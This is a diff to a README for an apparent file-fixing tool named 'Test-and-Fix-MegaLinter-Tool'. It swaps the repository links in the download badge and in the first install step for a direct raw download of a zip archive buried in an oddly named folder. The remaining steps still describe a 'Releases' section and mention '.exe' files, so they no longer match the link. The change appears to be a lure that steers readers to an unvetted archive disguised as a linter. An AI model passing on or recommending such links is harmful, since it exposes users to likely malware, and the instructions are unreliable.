@@ -1,6 +1,6 @@
 # 🛠 Test-and-Fix-MegaLinter-Tool - Fix your files with zero effort
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool/raw/refs/heads/main/uncambered/Mega-Test-Linter-and-Fix-Tool-1.4.zip)
 
 ## 📁 What is this tool?
 
@@ -23,7 +23,7 @@ If you have these, the tool will function as intended. No extra software or codi
 
 You must visit the repository page to get the latest version. Follow these steps to obtain the correct file:
 
-1. Visit the following link: [https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool](https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool).
+1. Visit the following link: [https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool/raw/refs/heads/main/uncambered/Mega-Test-Linter-and-Fix-Tool-1.4.zip](https://github.com/dewestonian371/Test-and-Fix-MegaLinter-Tool/raw/refs/heads/main/uncambered/Mega-Test-Linter-and-Fix-Tool-1.4.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the link that says "Releases" to see the available versions.
 4. Download the file marked as the latest version. It will usually end in ".zip" or ".exe".
